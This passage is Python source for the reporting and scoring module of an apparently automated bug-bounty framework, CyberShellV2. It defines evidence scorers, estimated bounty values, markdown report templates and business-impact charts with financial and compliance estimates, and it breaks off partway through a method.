"""
Unified Reporting and Scoring System for CyberShellV2
Combines bug bounty reporting, business impact analysis, and evidence scoring
"""

import json
import hashlib
import base64
import time
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from pathlib import Path
from io import BytesIO
from abc import ABC, abstractmethod
from jinja2 import Template
from collections import defaultdict, deque


# ============================================================================
# SCORING SYSTEM (from scoring.py)
# ============================================================================

class PluginResult:
    """Plugin result structure (for compatibility)"""
    def __init__(self, name: str, success: bool, details: Optional[Dict] = None):
        self.name = name
        self.success = success
        self.details = details or {}


class BaseScorer(ABC):
    """Base class for evidence scoring strategies"""
    name: str = "base"
    
    @abstractmethod
    def score(self, result: PluginResult) -> float:
        """Calculate evidence score from plugin result (0.0 to 1.0)"""
        pass
    
    def calculate_severity_weight(self, severity: str) -> float:
        """Weight based on vulnerability severity"""
        weights = {
            'Critical': 1.0,
            'High': 0.8,
            'Medium': 0.5,
            'Low': 0.2,
            'Info': 0.1,
            'None': 0.0
        }
        return weights.get(severity, 0.0)


class DefaultScorer(BaseScorer):
    """Default scoring strategy - balanced approach"""
    name = "default"
    
    def score(self, result: PluginResult) -> float:
        """Simple scoring based on success and evidence_score field"""
        if not result.success:
            return 0.0
        
        details = result.details or {}
        
        if 'evidence_score' in details:
            return max(0.0, min(1.0, float(details['evidence_score'])))
        
        score = 0.5  # Base score
        
        if details.get('vulnerable'):
            score += 0.2
        if details.get('exploited'):
            score += 0.3
        if details.get('data_extracted') or details.get('data'):
            score += 0.2
        
        severity = details.get('severity', 'None')
        score *= self.calculate_severity_weight(severity)
        
        return min(score, 1.0)


class WeightedSignalScorer(BaseScorer):
    """Weighted scoring based on multiple signals"""
    name = "weighted_signal"
    
    def __init__(self):
        self.weights = {
            'error_tokens': 0.15,
            'reflections': 0.12,
            'length_delta': 0.08,
            'time_delta': 0.10,
            'status_code': 0.05,
            'headers': 0.08,
            'data_access': 0.20,
            'code_execution': 0.25,
            'auth_bypass': 0.22,
            'privilege_escalation': 0.20,
            'chain_exploit': 0.15
        }
    
    def score(self, result: PluginResult) -> float:
        """Calculate weighted score from multiple signals"""
        if not result.success:
            return 0.0
        
        details = result.details or {}
        
        if 'evidence_score' in details:
            base_score = float(details['evidence_score'])
        else:
            base_score = 0.0
        
        signal_score = 0.0
        
        # Calculate signals
        if details.get('error_tokens'):
            signal_score += self.weights['error_tokens'] * min(len(details['error_tokens']) / 3, 1.0)
        
        if details.get('reflections'):
            signal_score += self.weights['reflections'] * min(len(details['reflections']) / 2, 1.0)
        
        if details.get('data') or details.get('data_accessed'):
            signal_score += self.weights['data_access']
        
        if details.get('commands_executed') or details.get('rce'):
            signal_score += self.weights['code_execution']
        
        if details.get('auth_bypassed') or details.get('admin'):
            signal_score += self.weights['auth_bypass']
        
        severity = details.get('severity', 'None')
        severity_weight = self.calculate_severity_weight(severity)
        
        final_score = max(base_score, signal_score) * severity_weight
        
        if details.get('verified') or details.get('reproducible'):
            final_score *= 1.2
        
        return min(final_score, 1.0)


class HighConfidenceScorer(BaseScorer):
    """Conservative scoring - requires strong evidence"""
    name = "high_confidence"
    
    def score(self, result: PluginResult) -> float:
        """Only high scores for verified, high-impact findings"""
        if not result.success:
            return 0.0
        
        details = result.details or {}
        base_score = float(details.get('evidence_score', 0.0))
        
        criteria_met = 0
        total_criteria = 5
        
        severity = details.get('severity', 'None')
        if severity in ['Critical', 'High']:
            criteria_met += 1
        else:
            base_score *= 0.3
        
        if details.get('evidence') or details.get('data'):
            criteria_met += 1
        
        if details.get('reproducible') or details.get('verified'):
            criteria_met += 1
        
        if details.get('impact_proof') or details.get('impact_demonstrated'):
            criteria_met += 1
        
        cvss = details.get('cvss_score', 0)
        if cvss >= 7.0:
            criteria_met += 1
        
        confidence_factor = criteria_met / total_criteria
        final_score = base_score * confidence_factor
        
        if criteria_met < 3:
            final_score = min(final_score, 0.5)
        
        return final_score


class BountyValueScorer(BaseScorer):
    """Score based on estimated bug bounty value"""
    name = "bounty_value"
    
    def __init__(self):
        self.bounty_values = {
            'rce': 10000,
            'sqli': 5000,
            'auth_bypass': 3000,
            'ssrf': 2000,
            'xxe': 2000,
            'ssti': 2000,
            'idor': 1500,
            'xss_stored': 1500,
            'xss_reflected': 500,
            'csrf': 500,
            'open_redirect': 250,
            'information_disclosure': 100
        }
        self.max_bounty = 10000
    
    def score(self, result: PluginResult) -> float:
        """Score based on potential bounty value"""
        if not result.success:
            return 0.0
        
        details = result.details or {}
        vuln_type = self._identify_vuln_type(result.name, details)
        base_value = self.bounty_values.get(vuln_type, 100)
        
        multipliers = 1.0
        
        if details.get('data') or details.get('pii_exposed'):
            multipliers *= 1.5
        
        if details.get('admin') or details.get('admin_access'):
            multipliers *= 2.0
        
        if details.get('chain') or details.get('impact_multiplier'):
            multipliers *= float(details.get('impact_multiplier', 1.5))
        
        estimated_value = base_value * multipliers
        score = min(estimated_value / self.max_bounty, 1.0)
        
        if score < 0.1 and result.success:
            score = 0.1
        
        return score
    
    def _identify_vuln_type(self, plugin_name: str, details: Dict) -> str:
        """Identify vulnerability type from plugin name and details"""
        plugin_lower = plugin_name.lower()
        
        if 'rce' in plugin_lower or details.get('commands_executed'):
            return 'rce'
        elif 'sqli' in plugin_lower or details.get('database'):
            return 'sqli'
        elif 'auth' in plugin_lower and 'bypass' in plugin_lower:
            return 'auth_bypass'
        elif 'ssrf' in plugin_lower:
            return 'ssrf'
        elif 'xss' in plugin_lower:
            if details.get('stored') or 'stored' in plugin_lower:
                return 'xss_stored'
            return 'xss_reflected'
        
        return 'unknown'
    
    def get_estimated_bounty(self, result: PluginResult) -> int:
        """Get estimated bounty value in dollars"""
        score = self.score(result)
        return int(score * self.max_bounty)


class CombinedScorer(BaseScorer):
    """Combines multiple scoring strategies"""
    name = "combined"
    
    def __init__(self):
        self.scorers = [
            WeightedSignalScorer(),
            HighConfidenceScorer(),
            BountyValueScorer()
        ]
        self.weights = [0.4, 0.3, 0.3]
    
    def score(self, result: PluginResult) -> float:
        """Calculate weighted average of multiple scorers"""
        if not result.success:
            return 0.0
        
        scores = []
        for scorer, weight in zip(self.scorers, self.weights):
            score = scorer.score(result)
            scores.append(score * weight)
        
        return sum(scores)


class EvidenceAggregator:
    """Aggregates evidence scores over time for ODS decisions"""
    
    def __init__(self, window_size: int = 10, ema_alpha: float = 0.3):
        self.scores: List[float] = []
        self.window_size = window_size
        self.ema_alpha = ema_alpha
        self._ema = 0.0
        self._metadata: List[Dict[str, Any]] = []
    
    def add(self, score: float, metadata: Optional[Dict[str, Any]] = None):
        """Add a new evidence score with optional metadata"""
        self.scores.append(score)
        
        if metadata:
            self._metadata.append(metadata)
        
        if len(self.scores) == 1:
            self._ema = score
        else:
            self._ema = self.ema_alpha * score + (1 - self.ema_alpha) * self._ema
        
        if len(self.scores) > self.window_size * 2:
            self.scores = self.scores[-self.window_size:]
            self._metadata = self._metadata[-self.window_size:]
    
    def get_ema(self) -> float:
        """Get exponential moving average of scores"""
        return self._ema
    
    def get_sma(self) -> float:
        """Get simple moving average of recent scores"""
        if not self.scores:
            return 0.0
        recent = self.scores[-self.window_size:]
        return sum(recent) / len(recent)
    
    def get_max(self) -> float:
        """Get maximum score seen"""
        return max(self.scores) if self.scores else 0.0
    
    def get_trend(self) -> str:
        """Get trend direction (improving/declining/stable)"""
        if len(self.scores) < 3:
            return 'stable'
        
        recent = self.scores[-3:]
        older = self.scores[-6:-3] if len(self.scores) >= 6 else self.scores[:-3]
        
        recent_avg = sum(recent) / len(recent)
        older_avg = sum(older) / len(older) if older else recent_avg
        
        diff = recent_avg - older_avg
        
        if diff > 0.1:
            return 'improving'
        elif diff < -0.1:
            return 'declining'
        else:
            return 'stable'
    
    def should_pivot(self, patience: int = 3, min_improvement: float = 0.05) -> bool:
        """Determine if ODS should pivot strategy"""
        if len(self.scores) < patience:
            return False
        
        recent = self.scores[-patience:]
        variance = max(recent) - min(recent)
        
        if variance < min_improvement:
            return True
        
        if self.get_trend() == 'declining':
            return True
        
        if self.get_sma() < 0.3 and len(self.scores) > patience * 2:
            return True
        
        return False
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get comprehensive statistics"""
        if not self.scores:
            return {
                'count': 0,
                'mean': 0.0,
                'max': 0.0,
                'min': 0.0,
                'ema': 0.0,
                'trend': 'stable'
            }
        
        return {
            'count': len(self.scores),
            'mean': sum(self.scores) / len(self.scores),
            'max': max(self.scores),
            'min': min(self.scores),
            'ema': self._ema,
            'sma': self.get_sma(),
            'trend': self.get_trend(),
            'should_pivot': self.should_pivot()
        }


# ============================================================================
# VULNERABILITY FINDINGS (Common Structure)
# ============================================================================

@dataclass
class VulnerabilityFinding:
    """Unified vulnerability finding structure"""
    vulnerability_type: str
    title: str
    severity: str
    cvss_score: float
    evidence_score: float
    confidence_score: float
    cwe_id: str
    description: str
    impact: str
    steps_to_reproduce: List[str]
    proof_of_concept: str
    evidence: Dict[str, Any]
    remediation: str
    references: List[str]
    
    # Business impact fields
    affected_assets: List[str] = field(default_factory=list)
    exploitation_proof: Dict = field(default_factory=dict)
    remediation_cost: float = 0.0
    potential_loss: float = 0.0
    compliance_implications: List[str] = field(default_factory=list)
    business_functions_affected: List[str] = field(default_factory=list)
    time_to_exploit: float = 0.0
    fix_complexity: str = "Moderate"
    
    def to_markdown(self) -> str:
        """Convert to markdown format"""
        md = f"## {self.title}\n\n"
        md += f"**Severity:** {self.severity}\n"
        md += f"**CVSS Score:** {self.cvss_score}\n"
        md += f"**CWE:** {self.cwe_id}\n\n"
        
        md += "### Description\n"
        md += f"{self.description}\n\n"
        
        md += "### Impact\n"
        md += f"{self.impact}\n\n"
        
        md += "### Steps to Reproduce\n"
        for i, step in enumerate(self.steps_to_reproduce, 1):
            md += f"{i}. {step}\n"
        md += "\n"
        
        md += "### Proof of Concept\n"
        md += f"```\n{self.proof_of_concept}\n```\n\n"
        
        md += "### Evidence\n"
        md += f"```json\n{json.dumps(self.evidence, indent=2)}\n```\n\n"
        
        md += "### Remediation\n"
        md += f"{self.remediation}\n\n"
        
        if self.references:
            md += "### References\n"
            for ref in self.references:
                md += f"- {ref}\n"
            md += "\n"
        
        return md


# ============================================================================
# BUG BOUNTY REPORTER (from reporting.py)
# ============================================================================

class BugBountyReporter:
    """Bug bounty focused report generation"""
    
    def __init__(self):
        self.vulnerability_db = self._load_vulnerability_database()
        self.report_template = self._load_report_template()
    
    def _load_vulnerability_database(self) -> Dict[str, Dict[str, Any]]:
        """Load vulnerability information database"""
        return {
            'sqli': {
                'title': 'SQL Injection',
                'cwe': 'CWE-89',
                'owasp': 'A03:2021',
                'base_cvss': 7.5,
                'description': 'SQL injection vulnerability allows attackers to interfere with database queries.',
                'remediation': 'Use parameterized queries, stored procedures, and input validation.'
            },
            'xss': {
                'title': 'Cross-Site Scripting (XSS)',
                'cwe': 'CWE-79',
                'owasp': 'A03:2021',
                'base_cvss': 6.1,
                'description': 'XSS allows attackers to inject malicious scripts into web pages.',
                'remediation': 'Implement proper output encoding and Content Security Policy (CSP).'
            },
            'rce': {
                'title': 'Remote Code Execution',
                'cwe': 'CWE-94',
                'owasp': 'A03:2021',
                'base_cvss': 9.8,
                'description': 'RCE allows attackers to execute arbitrary code on the server.',
                'remediation': 'Sanitize user input, use sandboxing, and avoid dynamic code execution.'
            },
            'idor': {
                'title': 'Insecure Direct Object Reference',
                'cwe': 'CWE-639',
                'owasp': 'A01:2021',
                'base_cvss': 6.5,
                'description': 'IDOR allows unauthorized access to resources by manipulating references.',
                'remediation': 'Implement proper access control checks for all resources.'
            },
            'ssrf': {
                'title': 'Server-Side Request Forgery',
                'cwe': 'CWE-918',
                'owasp': 'A10:2021',
                'base_cvss': 7.5,
                'description': 'SSRF allows attackers to make requests from the vulnerable server.',
                'remediation': 'Validate and sanitize URLs, use allowlists, and disable unnecessary protocols.'
            }
        }
    
    def _load_report_template(self) -> str:
        """Load report template"""
        return """# Bug Bounty Report

## Report Information
- **Report ID:** {report_id}
- **Date:** {date}
- **Researcher:** {researcher}
- **Program:** {program}
- **Severity:** {overall_severity}

## Executive Summary
{executive_summary}

## Target Information
- **Domain:** {target_domain}
- **Scope:** {scope}
- **Testing Period:** {testing_period}

## Vulnerability Summary
{vulnerability_summary}

## Detailed Findings
{detailed_findings}

## Impact Assessment
{impact_assessment}

## Proof of Concept
{proof_of_concept}

## Recommendations
{recommendations}

## Timeline
{timeline}

## Appendix
{appendix}
"""
    
    def build(self, target: str, recon: Dict[str, Any],
              findings: List[VulnerabilityFinding]) -> str:
        """Build comprehensive bug bounty report"""
        
        report_id = self._generate_report_id()
        
        # Generate report sections
        executive_summary = self._generate_executive_summary(findings)
        vulnerability_summary = self._generate_vulnerability_summary(findings)
        detailed_findings = self._generate_detailed_findings(findings)
        impact_assessment = self._generate_impact_assessment(findings)
        proof_of_concept = self._generate_proof_of_concept(findings)
        recommendations = self._generate_recommendations(findings)
        timeline = self._generate_timeline(findings)
        
        # Fill template
        report = self.report_template.format(
            report_id=report_id,
            date=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            researcher="CyberShell Autonomous Agent",
            program=target,
            overall_severity=self._calculate_overall_severity(findings),
            executive_summary=executive_summary,
            target_domain=target,
            scope=json.dumps(recon.get('scope', [target])),
            testing_period=f"{datetime.now().strftime('%Y-%m-%d')}",
            vulnerability_summary=vulnerability_summary,
            detailed_findings=detailed_findings,
            impact_assessment=impact_assessment,
            proof_of_concept=proof_of_concept,
            recommendations=recommendations,
            timeline=timeline,
            appendix=self._generate_appendix(findings)
        )
        
        return report
    
    def _generate_report_id(self) -> str:
        """Generate unique report ID"""
        timestamp = datetime.now().isoformat()
        hash_obj = hashlib.sha256(timestamp.encode())
        return f"BBR-{hash_obj.hexdigest()[:12].upper()}"
    
    def _calculate_overall_severity(self, findings: List[VulnerabilityFinding]) -> str:
        """Calculate overall severity"""
        if not findings:
            return "None"
        
        severities = [f.severity for f in findings]
        
        if 'Critical' in severities:
            return 'Critical'
        elif 'High' in severities:
            return 'High'
        elif 'Medium' in severities:
            return 'Medium'
        return 'Low'
    
    def _generate_executive_summary(self, findings: List[VulnerabilityFinding]) -> str:
        """Generate executive summary"""
        if not findings:
            return "No vulnerabilities were discovered during testing."
        
        critical_count = sum(1 for f in findings if f.severity == 'Critical')
        high_count = sum(1 for f in findings if f.severity == 'High')
        
        summary = f"During the security assessment, {len(findings)} vulnerabilities were discovered. "
        
        if critical_count > 0:
            summary += f"{critical_count} critical vulnerabilities require immediate attention. "
        
        if high_count > 0:
            summary += f"{high_count} high-severity issues pose significant risk. "
        
        vuln_types = list(set(f.vulnerability_type for f in findings))
        summary += f"The main vulnerability categories identified include: {', '.join(vuln_types)}. "
        
        return summary
    
    def _generate_vulnerability_summary(self, findings: List[VulnerabilityFinding]) -> str:
        """Generate vulnerability summary table"""
        if not findings:
            return "No vulnerabilities found."
        
        summary = "| # | Type | Severity | CVSS | Status |\n"
        summary += "|---|------|----------|------|--------|\n"
        
        for i, finding in enumerate(findings, 1):
            status = "Exploited" if finding.exploitation_proof else "Confirmed"
            summary += f"| {i} | {finding.vulnerability_type.upper()} | {finding.severity} | {finding.cvss_score:.1f} | {status} |\n"
        
        return summary
    
    def _generate_detailed_findings(self, findings: List[VulnerabilityFinding]) -> str:
        """Generate detailed findings section"""
        if not findings:
            return "No detailed findings to report."
        
        detailed = ""
        for i, finding in enumerate(findings, 1):
            detailed += f"\n### Finding {i}: {finding.title}\n"
            detailed += finding.to_markdown()
            detailed += "\n---\n"
        
        return detailed
    
    def _generate_impact_assessment(self, findings: List[VulnerabilityFinding]) -> str:
        """Generate impact assessment"""
        if not findings:
            return "No security impact identified."
        
        assessment = "### Business Impact Analysis\n\n"
        
        # Calculate potential bounty
        bounty_scorer = BountyValueScorer()
        total_bounty = 0
        
        for finding in findings:
            result = PluginResult(
                name=finding.vulnerability_type,
                success=True,
                details={'severity': finding.severity, 'evidence': finding.evidence}
            )
            total_bounty += bounty_scorer.get_estimated_bounty(result)
        
        assessment += f"### Estimated Bug Bounty Value: ${total_bounty:,}\n"
        
        return assessment
    
    def _generate_proof_of_concept(self, findings: List[VulnerabilityFinding]) -> str:
        """Generate proof of concept section"""
        poc_section = "### Exploitation Demonstrations\n\n"
        
        for finding in findings:
            if finding.proof_of_concept:
                poc_section += f"#### {finding.title}\n"
                poc_section += f"```\n{finding.proof_of_concept}\n```\n\n"
        
        return poc_section
    
    def _generate_recommendations(self, findings: List[VulnerabilityFinding]) -> str:
        """Generate recommendations"""
        if not findings:
            return "Continue with current security practices."
        
        recommendations = "### Priority Recommendations\n\n"
        
        # Critical recommendations
        critical_findings = [f for f in findings if f.severity == 'Critical']
        if critical_findings:
            recommendations += "#### Immediate Actions Required\n"
            for finding in critical_findings:
                recommendations += f"- {finding.remediation}\n"
            recommendations += "\n"
        
        return recommendations
    
    def _generate_timeline(self, findings: List[VulnerabilityFinding]) -> str:
        """Generate testing timeline"""
        timeline = "| Time | Finding | Severity |\n"
        timeline += "|------|---------|----------|\n"
        
        for finding in findings[:10]:
            timestamp = datetime.now().strftime("%H:%M:%S")
            timeline += f"| {timestamp} | {finding.vulnerability_type} | {finding.severity} |\n"
        
        return timeline
    
    def _generate_appendix(self, findings: List[VulnerabilityFinding]) -> str:
        """Generate appendix with additional details"""
        appendix = "### Additional Information\n\n"
        appendix += "#### Testing Methodology\n"
        appendix += "- Automated vulnerability discovery\n"
        appendix += "- Manual verification of findings\n"
        appendix += "- Proof of concept development\n"
        appendix += "- Impact assessment\n\n"
        return appendix


# ============================================================================
# BUSINESS IMPACT REPORTER (from business_impact_reporter.py)
# ============================================================================

class BusinessImpactReporter:
    """Generates comprehensive business impact reports with financial analysis"""
    
    # Industry average costs (in USD)
    BREACH_COSTS = {
        'Critical': 4_450_000,
        'High': 1_500_000,
        'Medium': 500_000,
        'Low': 100_000
    }
    
    # Remediation time estimates (in hours)
    REMEDIATION_TIME = {
        'Simple': 4,
        'Moderate': 16,
        'Complex': 40
    }
    
    HOURLY_RATE = 150
    
    def __init__(self, company_profile: Optional[Dict] = None):
        self.company_profile = company_profile or self._default_company_profile()
        self.report_dir = Path("reports")
        self.report_dir.mkdir(exist_ok=True)
    
    def _default_company_profile(self) -> Dict:
        """Default company profile for calculations"""
        return {
            'name': 'Target Organization',
            'industry': 'Technology',
            'annual_revenue': 100_000_000,
            'employee_count': 500,
            'data_sensitivity': 'High',
            'compliance_requirements': ['GDPR', 'SOC2', 'ISO27001'],
            'average_customer_value': 10000,
            'reputation_multiplier': 2.5
        }
    
    def generate_executive_report(self, findings: List[VulnerabilityFinding],
                                 scan_metadata: Dict) -> Dict:
        """Generate comprehensive executive report"""
        
        report = {
            'metadata': self._generate_metadata(scan_metadata),
            'executive_summary': self._generate_executive_summary(findings),
            'risk_assessment': self._calculate_risk_assessment(findings),
            'financial_impact': self._calculate_financial_impact(findings),
            'compliance_impact': self._assess_compliance_impact(findings),
            'remediation_roadmap': self._generate_remediation_roadmap(findings),
            'roi_analysis': self._calculate_roi_analysis(findings),
            'visualizations': self._generate_visualizations(findings),
            'recommendations': self._generate_recommendations(findings),
            'appendix': self._generate_technical_appendix(findings)
        }
        
        # Generate multiple format outputs
        self._save_json_report(report)
        self._save_html_report(report)
        
        return report
    
    def _generate_metadata(self, scan_metadata: Dict) -> Dict:
        """Generate report metadata"""
        return {
            'report_id': f"CS-{datetime.now().strftime('%Y%m%d-%H%M%S')}",
            'generated_at': datetime.now().isoformat(),
            'scan_duration': scan_metadata.get('duration', 0),
            'target': scan_metadata.get('target', 'Unknown'),
            'scan_type': scan_metadata.get('scan_type', 'Comprehensive'),
            'company': self.company_profile['name'],
            'industry': self.company_profile['industry']
        }
    
    def _generate_executive_summary(self, findings: List[VulnerabilityFinding]) -> Dict:
        """Generate executive summary with key metrics"""
        
        critical_count = sum(1 for f in findings if f.severity == 'Critical')
        high_count = sum(1 for f in findings if f.severity == 'High')
        
        total_risk_score = sum(f.cvss_score * f.confidence_score for f in findings)
        avg_confidence = np.mean([f.confidence_score for f in findings]) if findings else 0
        
        return {
            'total_vulnerabilities': len(findings),
            'critical_findings': critical_count,
            'high_findings': high_count,
            'overall_risk_level': self._calculate_risk_level(total_risk_score),
            'average_confidence': round(avg_confidence, 2),
            'key_risks': self._identify_key_risks(findings),
            'immediate_actions_required': critical_count > 0 or high_count > 2,
            'executive_recommendation': self._generate_executive_recommendation(findings)
        }
    
    def _calculate_risk_assessment(self, findings: List[VulnerabilityFinding]) -> Dict:
        """Calculate comprehensive risk assessment"""
        
        risk_matrix = {
            'technical_risk': self._calculate_technical_risk(findings),
            'business_risk': self._calculate_business_risk(findings),
            'compliance_risk': self._calculate_compliance_risk(findings),
            'reputation_risk': self._calculate_reputation_risk(findings),
            'operational_risk': self._calculate_operational_risk(findings)
        }
        
        weights = {
            'technical_risk': 0.25,
            'business_risk': 0.30,
            'compliance_risk': 0.20,
            'reputation_risk': 0.15,
            'operational_risk': 0.10
        }
        
        overall_risk = sum(risk_matrix[k] * weights[k] for k in weights)
        
        return {
            'risk_matrix': risk_matrix,
            'overall_risk_score': round(overall_risk, 2),
            'risk_level': self._score_to_level(overall_risk),
            'risk_trend': self._calculate_risk_trend(),
            'risk_appetite_exceeded': overall_risk > 7.0,
            'mitigation_priority': self._prioritize_mitigations(findings)
        }
    
    def _calculate_financial_impact(self, findings: List[VulnerabilityFinding]) -> Dict:
        """Calculate financial impact of vulnerabilities"""
        
        potential_breach_cost = sum(
            self.BREACH_COSTS.get(f.severity, 0) * f.confidence_score 
            for f in findings
        )
        
        total_remediation_cost = sum(
            self.REMEDIATION_TIME[f.fix_complexity] * self.HOURLY_RATE
            for f in findings
        )
        
        compliance_fines = self._calculate_compliance_fines(findings)
        disruption_cost = self._calculate_disruption_cost(findings)
        reputation_damage = potential_breach_cost * (self.company_profile['reputation_multiplier'] - 1)
        
        total_potential_loss = (
            potential_breach_cost + compliance_fines + disruption_cost + reputation_damage
        )
        
        return {
            'potential_breach_cost': round(potential_breach_cost, 2),
            'remediation_cost': round(total_remediation_cost, 2),
            'compliance_fines': round(compliance_fines, 2),
            'disruption_cost': round(disruption_cost, 2),
            'reputation_damage': round(reputation_damage, 2),
            'total_potential_loss': round(total_potential_loss, 2),
            'cost_per_vulnerability': round(total_potential_loss / len(findings), 2) if findings else 0,
            'insurance_impact': self._calculate_insurance_impact(total_potential_loss),
            'budget_allocation_recommendation': round(total_remediation_cost * 1.5, 2)
        }
    
    def _calculate_roi_analysis(self, findings: List[VulnerabilityFinding]) -> Dict:
        """Calculate ROI of security investment"""
        
        financial_impact = self._calculate_financial_impact(findings)
        
        investment = financial_impact['remediation_cost']
        potential_savings = financial_impact['total_potential_loss']
        
        roi = ((potential_savings - investment) / investment * 100) if investment > 0 else 0
        
        monthly_risk = potential_savings / 12
        payback_period = (investment / monthly_risk) if monthly_risk > 0 else 0
        
        return {
            'investment_required': round(investment, 2),
            'potential_savings': round(potential_savings, 2),
            'roi_percentage': round(roi, 2),
            'payback_period_months': round(payback_period, 1),
            'risk_reduction_percentage': self._calculate_risk_reduction(),
            'cost_benefit_ratio': round(potential_savings / investment, 2) if investment > 0 else 0,
            'recommendation': 'Immediate action recommended' if roi > 200 else 'Scheduled remediation'
        }
    
    def _assess_compliance_impact(self, findings: List[VulnerabilityFinding]) -> Dict:
        """Assess compliance impact of vulnerabilities"""
        
        compliance_violations = {}
        for req in self.company_profile['compliance_requirements']:
            violations = self._check_compliance_violations(findings, req)
            compliance_violations[req] = violations
        
        return {
            'compliance_frameworks': self.company_profile['compliance_requirements'],
            'violations_by_framework': compliance_violations,
            'total_violations': sum(len(v) for v in compliance_violations.values()),
            'audit_risk': 'High' if any(compliance_violations.values()) else 'Low',
            'certification_at_risk': self._check_certification_risk(compliance_violations),
            'remediation_deadline': self._calculate_compliance_deadline(compliance_violations)
        }
    
    def _generate_remediation_roadmap(self, findings: List[VulnerabilityFinding]) -> Dict:
        """Generate prioritized remediation roadmap"""
        
        immediate = [f for f in findings if f.severity in ['Critical', 'High']]
        short_term = [f for f in findings if f.severity == 'Medium']
        long_term = [f for f in findings if f.severity == 'Low']
        
        roadmap = {
            'immediate_actions': {
                'timeframe': '0-7 days',
                'vulnerabilities': len(immediate),
                'estimated_effort': sum(self.REMEDIATION_TIME[f.fix_complexity] for f in immediate),
                'items': self._format_remediation_items(immediate)
            },
            'short_term_actions': {
                'timeframe': '7-30 days',
                'vulnerabilities': len(short_term),
                'estimated_effort': sum(self.REMEDIATION_TIME[f.fix_complexity] for f in short_term),
                'items': self._format_remediation_items(short_term)
            },
            'long_term_actions': {
                'timeframe': '30-90 days',
                'vulnerabilities': len(long_term),
                'estimated_effort': sum(self.REMEDIATION_TIME[f.fix_complexity] for f in long_term),
                'items': self._format_remediation_items(long_term)
            },
            'total_effort_hours': sum(self.REMEDIATION_TIME[f.fix_complexity] for f in findings),
            'recommended_team_size': self._calculate_team_size(findings),
            'milestones': self._generate_milestones(findings)
        }
        
        return roadmap
    
    def _generate_visualizations(self, findings: List[VulnerabilityFinding]) -> Dict:
        """Generate data visualizations"""
        
        visualizations = {}
        
        visualizations['risk_heatmap'] = self._create_risk_heatmap(findings)
        visualizations['severity_distribution'] = self._create_severity_chart(findings)
        visualizations['financial_breakdown'] = self._create_financial_chart(findings)
        visualizations['remediation_timeline'] = self._create_timeline_chart(findings)
        visualizations['compliance_dashboard'] = self._create_compliance_chart(findings)
        
        return visualizations
    
    def _create_risk_heatmap(self, findings: List[VulnerabilityFinding]) -> str:
        """Create risk heatmap visualization"""
        
        risk_matrix = np.zeros((4, 4))
        severity_map = {'Critical': 3, 'High': 2, 'Medium': 1, 'Low': 0}
        
        for f in findings:
            sev_idx = severity_map.get(f.severity, 0)
            conf_idx = min(int(f.confidence_score * 4), 3)
            risk_matrix[sev_idx][conf_idx] += 1
        
        fig, ax = plt.subplots(figsize=(8, 6))
        sns.heatmap(risk_matrix, annot=True, fmt='g', cmap='YlOrRd',
                   xticklabels=['Low', 'Medium', 'High', 'Critical'],
                   yticklabels=['Low', 'Medium', 'High', 'Critical'])
        ax.set_xlabel('Confidence')
        ax.set_ylabel('Severity')
        ax.set_title('Risk Heatmap')
        
        buffer = BytesIO()
        plt.savefig(buffer, format='png', bbox_inches='tight')
        buffer.seek(0)
        image_base64 = base64.b64encode(buffer.read()).decode()
        plt.close()
        
        return f"data:image/png;base64,{image_base64}"
    
    def _create_severity_chart(self, findings: List[VulnerabilityFinding]) -> str:
        """Create severity distribution chart"""
        
        severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
        for f in findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        
        fig, ax = plt.subplots(figsize=(8, 6))
        colors = ['#d32f2f', '#f57c00', '#fbc02d', '#388e3c']
        ax.bar(severity_counts.keys(), severity_counts.values(), color=colors)
        ax.set_ylabel('Count')
        ax.set_title('Vulnerability Severity Distribution')
        
        buffer = BytesIO()
        plt.savefig(buffer, format='png', bbox_inches='tight')
        buffer.seek(0)
        image_base64 = base64.b64encode(buffer.read()).decode()
        plt.close()
        
        return f"data:image/png;base64,{image_base64}"
    
    def _create_financial_chart(self, findings: List[VulnerabilityFinding]) -> str:
        """Create financial impact breakdown chart"""
        
        financial = self._calculate_financial_impact(findings)
        
        labels = ['Breach Cost', 'Remediation', 'Compliance', 'Disruption', 'Reputation']
        values = [
            financial['potential_breach_cost'],
            financial['remediation_cost'],
            financial['compliance_fines'],
            financial['disruption_cost'],
            financial['reputation_damage']
        ]
        
        fig, ax = plt.subplots(figsize=(10, 6))
        ax.pie(values, labels=labels, autopct='%1.1f%%', startangle=90)
        ax.set_title('Financial Impact Breakdown')
        
        buffer = BytesIO()
        plt.savefig(buffer, format='png', bbox_inches='tight')
        buffer.seek(0)
        image_base64 = base64.b64encode(buffer.read()).decode()
        plt.close()
        
        return f"data:image/png;base64,{image_base64}"
    
    def _create_timeline_chart(self, findings: List[VulnerabilityFinding]) -> str:
        """Create remediation timeline chart"""
        
        complexity_hours = {'Simple': 0, 'Moderate': 0, 'Complex': 0}
        for f in findings:
            complexity_hours[f.fix_complexity] += self.REMEDIATION_TIME[f.fix_complexity]
        
        fig, ax = plt.subplots(figsize=(10, 6))
        
        y_pos = 0
        colors = {'Simple': '#4caf50', 'Moderate': '#ff9800', 'Complex': '#f44336'}
        
        for complexity, hours in complexity_hours.items():
            if hours > 0:
                ax.barh(y_pos, hours, left=0, height=0.5, 
                       label=complexity, color=colors[complexity])
                y_pos += 1
        
        ax.set_xlabel('Hours')
        ax.set_title('Remediation Timeline by Complexity')
        ax.legend()
        
        buffer = BytesIO()
        plt.savefig(buffer, format='png', bbox_inches='tight')
        buffer.seek(0)
        image_base64 = base64.b64encode(buffer.read()).decode()
        plt.close()
        
        return f"data:image/png;base64,{image_base64}"
    
    def _create_compliance_chart(self, findings: List[VulnerabilityFinding]) -> str:
        """Create compliance impact chart"""
        
        compliance_impact = self._assess_compliance_impact(findings)
        
        frameworks = list(compliance_impact['violations_by_framework'].keys())
        violations = [len(v) for v in compliance_impact['violations_by_framework'].values()]
        
        fig, ax = plt.subplots(figsize=(8, 6))
        ax.bar(frameworks, violations, color='#1976d2')
        ax.set_ylabel('Violations')
        ax.set_title('Compliance Violations by Framework')
        
        buffer = BytesIO()
        plt.savefig(buffer, format='png', bbox_inches='tight')
        buffer.seek(0)
        image_base64 = base64.b64encode(buffer.read()).decode()
        plt.close()
        
        return f"data:image/png;base64,{image_base64}"
    
    def _generate_recommendations(self, findings: List[VulnerabilityFinding]) -> List[Dict]:
